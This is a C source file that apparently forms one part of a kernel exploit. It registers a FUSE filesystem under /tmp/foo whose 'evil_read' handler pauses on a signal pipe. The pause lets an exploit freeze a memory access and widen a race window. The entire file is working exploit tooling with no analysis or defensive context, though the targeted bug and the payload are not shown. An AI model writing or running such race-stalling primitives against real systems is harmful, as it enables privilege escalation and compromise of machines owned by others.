#include "fuse.h"

#include <string.h>
#include <sys/stat.h>
#include <errno.h>
#include <libfuse/fuse.h>
#include <unistd.h>

extern int sig_pipe[2];

char *fuse_argv[] = {"exploit", "/tmp/foo", NULL};
int fuse_argc = sizeof(fuse_argv) / sizeof(char *) - 1;
struct fuse_operations fuse_ops = {
    .getattr = get_attr,
    .readdir = read_dir,
    .read = evil_read,
};
int fuse_fd;

int get_attr(const char *path, struct stat* stbuf, struct fuse_file_info *fi) {
    if (!strcmp(path, "/")) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
        return 0;
    }
    else {
        stbuf->st_mode = S_IFREG | 0644;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
        return 0;
    }
    return -ENOENT;
}

int read_dir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset,
             struct fuse_file_info *fi, enum fuse_readdir_flags flags) {

    filler(buf, ".", NULL, 0, FUSE_FILL_DIR_PLUS);
    filler(buf, "..", NULL, 0, FUSE_FILL_DIR_PLUS);
    if (!strcmp(path, "/"))
        filler(buf, "slavin", NULL, 0, FUSE_FILL_DIR_PLUS);
    return 0;
}

int evil_read(const char *path, char *buf, size_t size,
              off_t offset, struct fuse_file_info *fi) {
    char signal;
    char tmp_buf[0x1000];
    
    memset(tmp_buf, 0, sizeof(tmp_buf));

    if (size > 0x1000) 
        size = 0x1000;
    if (size + offset > 0x1000)
        size = 0x1000 - offset;
    
    memcpy(buf, tmp_buf + offset, size);

    read(sig_pipe[0], &signal, 1);

    return size;
}
